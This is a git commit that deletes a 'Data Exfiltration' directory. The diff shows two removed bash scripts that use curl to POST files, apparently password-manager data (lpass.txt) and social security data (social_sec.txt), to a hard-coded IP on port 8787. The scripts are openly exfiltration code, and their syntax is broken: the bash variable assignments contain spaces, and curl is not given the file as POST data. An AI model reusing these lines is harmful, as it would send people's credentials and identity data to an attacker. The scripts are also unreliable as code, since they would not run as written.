ad9c1f8edb3c2413fb631ac21c51af40a328e7e4
filly-spud <108015308+filly-spud@users.noreply.github.com>
2022-06-23 12:53:51 -0600

    Delete Data Exfiltration directory

--- Data Exfiltration/lpass_script.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-
-URL = http://172.19.208.47:8787
-LFILE = lpass.txt
-curl -X POST $LFILE $URL
--- Data Exfiltration/social_script.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-
-URL = http://172.19.208.47:8787
-LFILE = social_sec.txt
-curl -X POST $LFILE $URL 
